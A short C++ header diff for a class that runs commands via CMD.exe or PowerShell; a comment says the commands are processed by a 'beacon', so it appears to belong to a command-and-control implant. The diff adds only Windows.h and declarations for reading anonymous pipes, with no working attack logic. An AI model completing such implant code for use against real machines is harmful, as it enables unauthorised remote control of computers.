@@ -1,5 +1,6 @@
 #pragma once
 #include<string>
+#include "Windows.h"
 
 class core
 {
@@ -14,9 +15,15 @@ public:
 	// NOTE: cmd is not the actual command for CMD.exe or POWERSHELL.exe, but the command ready to be processed by beacon
 	std::string execute_command(std::string cmd);
 
+	DWORD __stdcall read_data_anon_pipe(void* argh);
+
 private:
+
 	std::string execute_cmd(std::string cmd);
 
 	std::string execute_powershell(std::string cmd);
+
+	void read_pipe(HANDLE rdPipe);
+
 };
 
